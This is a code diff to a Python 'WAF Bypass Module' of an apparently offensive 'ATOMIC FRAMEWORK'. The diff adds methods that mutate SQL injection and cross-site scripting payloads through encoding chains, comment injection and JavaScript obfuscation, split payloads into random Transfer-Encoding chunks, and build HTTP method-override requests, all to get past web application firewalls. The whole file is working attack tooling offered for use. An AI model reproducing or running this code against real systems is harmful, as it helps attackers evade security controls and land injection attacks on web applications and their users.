@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ATOMIC FRAMEWORK - WAF Bypass Module
-Web Application Firewall bypass techniques
+ATOMIC FRAMEWORK v8.0 - ULTIMATE EDITION
+WAF Bypass Module - Advanced techniques
 """
 
 import os
@@ -188,3 +188,69 @@ class WAFBypass:
             'data': data,
             'headers': bypass_headers,
         }
+    
+    def advanced_bypass(self, payload: str, waf_type: str = None) -> list:
+        """Advanced WAF bypass with evasion engine integration"""
+        variants = self.bypass_techniques(payload, waf_type)
+        
+        try:
+            from utils.evasion import PayloadMutator
+            mutator = PayloadMutator()
+            
+            variants.append(mutator.mutate(payload, 'encode_chain'))
+            variants.append(mutator.mutate(payload, 'mixed_encode'))
+            variants.append(mutator.mutate(payload, 'case_alternate'))
+            
+            if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR']):
+                variants.append(mutator.mutate(payload, 'comment_inject'))
+                variants.append(mutator.mutate(payload, 'concat_split'))
+                variants.append(mutator.mutate(payload, 'whitespace_random'))
+            
+            if '<' in payload or 'script' in payload.lower():
+                variants.append(mutator.mutate(payload, 'html_entity'))
+                variants.append(mutator.mutate(payload, 'js_obfuscate'))
+        except Exception:
+            pass
+        
+        return list(set(variants))
+    
+    def generate_chunked_request(self, url: str, payload: str) -> dict:
+        """Generate Transfer-Encoding chunked request for WAF bypass"""
+        chunk_size = random.randint(1, 4)
+        chunks = []
+        i = 0
+        while i < len(payload):
+            end = min(i + chunk_size, len(payload))
+            chunk_data = payload[i:end]
+            chunks.append(f"{len(chunk_data):x}\r\n{chunk_data}\r\n")
+            i = end
+            chunk_size = random.randint(1, 4)
+        chunks.append("0\r\n\r\n")
+        
+        return {
+            'url': url,
+            'headers': {
+                'Transfer-Encoding': 'chunked',
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            'body': ''.join(chunks),
+        }
+    
+    def method_override_bypass(self, url: str, data: dict = None) -> list:
+        """Generate requests with HTTP method override headers"""
+        overrides = [
+            {'X-HTTP-Method': 'PUT'},
+            {'X-HTTP-Method-Override': 'PUT'},
+            {'X-Method-Override': 'PUT'},
+            {'X-HTTP-Method': 'PATCH'},
+        ]
+        
+        results = []
+        for override in overrides:
+            results.append({
+                'url': url,
+                'method': 'POST',
+                'data': data,
+                'headers': override,
+            })
+        return results
